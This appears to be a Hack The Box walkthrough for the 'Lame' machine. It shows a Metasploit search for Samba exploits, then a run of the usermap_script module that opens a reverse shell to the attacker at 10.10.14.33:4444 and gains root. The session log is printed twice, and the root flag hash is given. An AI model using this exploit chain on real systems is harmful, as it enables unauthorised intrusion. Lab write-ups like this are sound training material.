# Lame

URL: https://app.hackthebox.com/machines/Lame

Level: Easy

Date 29 May 2020

## Walkthrough

- [Enumeration](#enumeration)

# Enumeration

## NMAP

We found SAMBA service.

We search in `msfconsole`:

```
msf5 exploit(unix/misc/distcc_exec) > search samba 3.0.20

Matching Modules
================

   #   Name                                                   Disclosure Date  Rank       Check  Description
   -   ----                                                   ---------------  ----       -----  -----------
   0   auxiliary/admin/http/wp_easycart_privilege_escalation  2015-02-25       normal     Yes    WordPress WP EasyCart Plugin Privilege Escalation
   1   auxiliary/admin/smb/samba_symlink_traversal                             normal     No     Samba Symlink Directory Traversal
   2   auxiliary/dos/samba/lsa_addprivs_heap                                   normal     No     Samba lsa_io_privilege_set Heap Overflow
   3   auxiliary/dos/samba/lsa_transnames_heap                                 normal     No     Samba lsa_io_trans_names Heap Overflow
   4   auxiliary/dos/samba/read_nttrans_ea_list                                normal     No     Samba read_nttrans_ea_list Integer Overflow
   5   auxiliary/scanner/rsync/modules_list                                    normal     No     List Rsync Modules
   6   auxiliary/scanner/smb/smb_uninit_cred                                   normal     Yes    Samba _netr_ServerPasswordSet Uninitialized Credential State
   7   exploit/freebsd/samba/trans2open                       2003-04-07       great      No     Samba trans2open Overflow (*BSD x86)
   8   exploit/linux/samba/chain_reply                        2010-06-16       good       No     Samba chain_reply Memory Corruption (Linux x86)
   9   exploit/linux/samba/is_known_pipename                  2017-03-24       excellent  Yes    Samba is_known_pipename() Arbitrary Module Load
   10  exploit/linux/samba/lsa_transnames_heap                2007-05-14       good       Yes    Samba lsa_io_trans_names Heap Overflow
   11  exploit/linux/samba/setinfopolicy_heap                 2012-04-10       normal     Yes    Samba SetInformationPolicy AuditEventsInfo Heap Overflow
   12  exploit/linux/samba/trans2open                         2003-04-07       great      No     Samba trans2open Overflow (Linux x86)
   13  exploit/multi/samba/nttrans                            2003-04-07       average    No     Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow
   14  exploit/multi/samba/usermap_script                     2007-05-14       excellent  No     Samba "username map script" Command Execution
   15  exploit/osx/samba/lsa_transnames_heap                  2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
   16  exploit/osx/samba/trans2open                           2003-04-07       great      No     Samba trans2open Overflow (Mac OS X PPC)
   17  exploit/solaris/samba/lsa_transnames_heap              2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
   18  exploit/solaris/samba/trans2open                       2003-04-07       great      No     Samba trans2open Overflow (Solaris SPARC)
   19  exploit/unix/http/quest_kace_systems_management_rce    2018-05-31       excellent  Yes    Quest KACE Systems Management Command Injection
   20  exploit/unix/misc/distcc_exec                          2002-02-01       excellent  Yes    DistCC Daemon Command Execution
   21  exploit/unix/webapp/citrix_access_gateway_exec         2010-12-21       excellent  Yes    Citrix Access Gateway Command Execution
   22  exploit/windows/fileformat/ms14_060_sandworm           2014-10-14       excellent  No     MS14-060 Microsoft Windows OLE Package Manager Code Execution
   23  exploit/windows/http/sambar6_search_results            2003-06-21       normal     Yes    Sambar 6 Search Results Buffer Overflow
   24  exploit/windows/license/calicclnt_getconfig            2005-03-02       average    No     Computer Associates License Client GETCONFIG Overflow
   25  exploit/windows/smb/group_policy_startup               2015-01-26       manual     No     Group Policy Script Execution From Shared Resource
   26  post/linux/gather/enum_configs                                          normal     No     Linux Gather Configurations


```

We try `exploit/multi/samba/usermap_script`:

```
msf5 exploit(unix/misc/distcc_exec) > use exploit/multi/samba/usermap_script
msf5 exploit(multi/samba/usermap_script) > show options

Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   139              yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3


msf5 exploit(multi/samba/usermap_script) > run

[*] Started reverse TCP double handler on 10.10.14.33:4444
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo 807hbG2JR8cHz7Qj;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "807hbG2JR8cHz7Qj\r\n"
[*] Matching...
[*] A is input...
/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/activerecord-4.2.11.1/lib/active_record/statement_cache.rb:90: warning: Capturing the given block using Proc.new is deprecated; use `&block` instead
[*] Command shell session 2 opened (10.10.14.33:4444 -> 10.10.10.3:59002) at 2020-06-09 23:25:40 +0200
msf5 exploit(unix/misc/distcc_exec) > use exploit/multi/samba/usermap_script
msf5 exploit(multi/samba/usermap_script) > show options

Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   139              yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3


msf5 exploit(multi/samba/usermap_script) > run

[*] Started reverse TCP double handler on 10.10.14.33:4444
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo 807hbG2JR8cHz7Qj;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "807hbG2JR8cHz7Qj\r\n"
[*] Matching...
[*] A is input...
/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/activerecord-4.2.11.1/lib/active_record/statement_cache.rb:90: warning: Capturing the given block using Proc.new is deprecated; use `&block` instead
[*] Command shell session 2 opened (10.10.14.33:4444 -> 10.10.10.3:59002) at 2020-06-09 23:25:40 +0200
```

We are already root:

```
id
uid=0(root) gid=0(root)
python -c 'import pty; pty.spawn("/bin/bash")'
root@lame:/#

root@lame:/# cd root
root@lame:/root# cat root.txt
cat root.txt
92caac3be140ef409e45721348a4e9df
```

